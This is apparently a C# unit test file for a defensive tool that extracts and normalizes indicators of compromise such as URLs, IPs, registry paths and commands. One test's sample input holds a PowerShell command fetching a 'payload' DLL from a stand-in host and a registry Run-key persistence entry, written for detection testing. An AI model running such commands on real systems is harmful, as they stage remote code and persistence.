using Detector.Analysis;

namespace Detector.Tests;

public sealed class IndicatorExtractorTests
{
    [Fact]
    public void Extract_FindsAndNormalizesCommonDefenderIndicators()
    {
        const string text = """
            powershell.exe -NoProfile -File C:\Temp\collect.ps1
            Invoke-WebRequest https://Example.invalid/payload -OutFile C:\Temp\stage.dll
            $server = '192.0.2.10'
            New-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name Demo
            """;

        var indicators = IndicatorExtractor.Extract(text, "synthetic");

        Assert.Contains(indicators, item => item.Kind == IndicatorKind.Url && item.Value == "https://example.invalid/payload");
        Assert.Contains(indicators, item => item.Kind == IndicatorKind.Domain && item.Value == "example.invalid");
        Assert.Contains(indicators, item => item.Kind == IndicatorKind.IpAddress && item.Value == "192.0.2.10");
        Assert.Contains(indicators, item => item.Kind == IndicatorKind.RegistryPath && item.Value.Contains("CurrentVersion\\Run", StringComparison.Ordinal));
        Assert.Contains(indicators, item => item.Kind == IndicatorKind.FilePath && item.Value == "C:\\Temp\\stage.dll");
        Assert.Contains(indicators, item => item.Kind == IndicatorKind.Command && item.Value.StartsWith("powershell.exe", StringComparison.OrdinalIgnoreCase));
    }

    [Fact]
    public void Extract_DeduplicatesEquivalentValuesAndHonorsResultLimit()
    {
        const string text = "https://example.invalid/a https://EXAMPLE.invalid/a https://b.invalid/a";

        var indicators = IndicatorExtractor.Extract(text, "synthetic", maximumResults: 2);

        Assert.Equal(2, indicators.Count);
        Assert.Single(indicators.Where(item => item.Kind == IndicatorKind.Url && item.Value.Contains("example.invalid", StringComparison.Ordinal)));
    }

    [Fact]
    public void Extract_DoesNotTreatExecutableNamesAsDomains()
    {
        var indicators = IndicatorExtractor.Extract("powershell.exe -NoProfile", "synthetic");

        Assert.DoesNotContain(indicators, item => item.Kind == IndicatorKind.Domain);
    }

    [Fact]
    public void Extract_DoesNotTreatDotNetIdentifiersAsDomains()
    {
        const string source = "System.Reflection.Assembly.Load(value); StringComparison.OrdinalIgnoreCase";

        var indicators = IndicatorExtractor.Extract(source, "Synthetic.cs");

        Assert.DoesNotContain(indicators, item => item.Kind == IndicatorKind.Domain);
    }
}
